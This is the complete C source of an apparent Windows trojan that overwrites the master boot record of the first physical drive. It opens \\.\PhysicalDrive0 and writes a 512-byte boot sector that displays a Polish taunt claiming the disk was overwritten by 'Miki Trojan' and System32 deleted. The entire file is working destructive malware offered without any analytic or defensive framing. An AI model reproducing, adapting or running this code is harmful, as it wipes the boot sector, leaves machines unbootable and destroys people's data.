#include <windows.h>


const unsigned char MasterBootRecord[] = {
0xEB, 0x00, 0xE8, 0x1F, 0x00, 0x8C, 0xC8, 0x8E, 0xD8, 0xBE, 0x33, 0x7C, 0xE8, 0x00, 0x00, 0x50, 
0xFC, 0x8A, 0x04, 0x3C, 0x00, 0x74, 0x06, 0xE8, 0x05, 0x00, 0x46, 0xEB, 0xF4, 0xEB, 0xFE, 0xB4, 
0x0E, 0xCD, 0x10, 0xC3, 0xB4, 0x07, 0xB0, 0x04, 0xB7, 0x02, 0xB9, 0x00, 0x00, 0xBA, 0x4F, 0x18, 
0xCD, 0x10, 0xC3, 0x48, 0x61, 0x68, 0x61, 0x20, 0x54, 0x77, 0x6F, 0x6A, 0x20, 0x64, 0x79, 0x73, 
0x6B, 0x20, 0x7A, 0x6F, 0x73, 0x74, 0x61, 0x6C, 0x20, 0x6E, 0x61, 0x64, 0x70, 0x69, 0x73, 0x61, 
0x6E, 0x79, 0x20, 0x70, 0x72, 0x7A, 0x65, 0x7A, 0x20, 0x4D, 0x69, 0x6B, 0x69, 0x20, 0x54, 0x72, 
0x6F, 0x6A, 0x61, 0x6E, 0x7E, 0x21, 0x0D, 0x0A, 0x54, 0x79, 0x3A, 0x43, 0x6F, 0x20, 0x74, 0x75, 
0x20, 0x73, 0x69, 0x65, 0x20, 0x73, 0x74, 0x61, 0x6C, 0x6F, 0x3F, 0x20, 0x43, 0x7A, 0x79, 0x20, 
0x6D, 0x6F, 0x67, 0x65, 0x20, 0x74, 0x6F, 0x20, 0x6E, 0x61, 0x70, 0x72, 0x61, 0x77, 0x69, 0x63, 
0x3F, 0x0D, 0x0A, 0x4E, 0x69, 0x65, 0x20, 0x70, 0x6F, 0x6E, 0x69, 0x65, 0x77, 0x61, 0x7A, 0x2C, 
0x20, 0x64, 0x79, 0x73, 0x6B, 0x20, 0x7A, 0x6F, 0x73, 0x74, 0x61, 0x6C, 0x20, 0x6E, 0x61, 0x64, 
0x70, 0x69, 0x73, 0x61, 0x6E, 0x79, 0x20, 0x61, 0x20, 0x66, 0x6F, 0x6C, 0x64, 0x65, 0x72, 0x20, 
0x53, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x33, 0x32, 0x20, 0x75, 0x73, 0x75, 0x6E, 0x69, 0x65, 0x74, 
0x79, 0x21, 0x20, 0x3A, 0x44, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x55, 0xAA
};

int CALLBACK WinMain(
    HINSTANCE hInstance, HINSTANCE hPrevInstance,
    LPSTR     lpCmdLine, int       nCmdShow
)
{
    

    DWORD dwBytesWritten;
    HANDLE hDevice = CreateFileW(
        L"\\\\.\\PhysicalDrive0", GENERIC_ALL,
        FILE_SHARE_READ | FILE_SHARE_WRITE, 0,
        OPEN_EXISTING, 0, 0);

    WriteFile(hDevice, MasterBootRecord, 512, &dwBytesWritten, 0);
    CloseHandle(hDevice);
}
